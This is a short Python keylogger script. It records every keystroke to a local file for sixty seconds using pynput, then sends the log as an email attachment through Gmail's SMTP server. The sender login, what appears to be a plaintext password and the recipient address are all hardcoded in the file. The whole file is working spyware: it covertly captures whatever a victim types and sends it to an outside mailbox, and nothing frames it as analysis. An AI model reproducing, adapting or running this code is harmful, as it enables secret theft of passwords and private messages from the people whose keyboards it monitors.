from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Timer
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    print(str(key))
    logging.info(str(key))
def sendMail(toaddr):
    msg = MIMEMultipart()
    filename = "keylog.txt"
    attachment = open("keylog.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("spykeyph@gmail.com", "hpyekyps")
    text = msg.as_string()
    s.sendmail("spykeyph066@gmail.com", toaddr, text)
    s.quit()
 
with Listener(on_press=on_press) as listener :
    Timer(60, listener.stop).start()
    print("before")
    listener.join()
    print("after")
sendMail("prabuksp06@gmail.com")